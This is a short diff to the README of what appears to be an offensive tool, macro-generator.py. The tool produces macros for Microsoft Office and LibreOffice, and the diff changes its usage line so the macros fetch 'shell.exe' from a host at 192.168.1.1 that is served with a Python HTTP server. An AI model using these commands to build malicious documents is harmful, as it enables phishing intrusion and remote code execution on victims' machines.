@@ -15,7 +15,7 @@ python3 -m http.server 80
 
 Generate macros to paste in Microsoft Office and Libre Office
 ```
-python3 macro-generator.py --host 192.168.1.1 --port 443 -r 'shell.exe'
+python3 macro-generator.py --host 192.168.1.1 --port 443 -r ':80/shell.exe'
 ```
 
 Help Menu
